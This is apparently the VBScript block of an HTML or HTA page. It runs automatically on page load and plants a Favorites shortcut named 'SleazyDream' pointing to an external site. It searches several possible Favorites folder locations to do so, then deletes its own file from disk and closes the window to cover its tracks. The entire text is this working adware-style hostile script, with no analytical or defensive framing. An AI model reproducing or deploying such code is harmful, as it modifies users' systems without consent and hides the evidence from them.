
Sub Suicide()
dim fn, f, fs,u
u = UnEsc(document.url)
fn=right(u,len(u)-len("File://"))
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFile(fn)
f.Delete true
End Sub
sub SetFav(Location,Target)
Dim wshell, fso, wnet, WF, Shor, loc, locT
Set wshell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wnet = createobject("Wscript.Network")
Set WF = fso.GetSpecialFolder(WindowsFolder)
loc = WF
locT = loc &"\Favorites"
If (fso.FolderExists(locT)) Then
   loc = locT
Else
locT =fso.GetDriveName(WF)&"\Documents and Settings\"&wnet.UserName&"\Favorites"
if fso.FolderExists(locT)then 
loc = locT
else
exit sub
end if
End If
Set Shor = wshell.CreateShortcut(loc&"\ "&Location&".URL")
Shor.TargetPath = Target
Shor.Save
end sub
Sub window_onload
SetFav "SleazyDream", "http://www.sleazydream.com/main.html"

Suicide
self.close
End Sub

''#
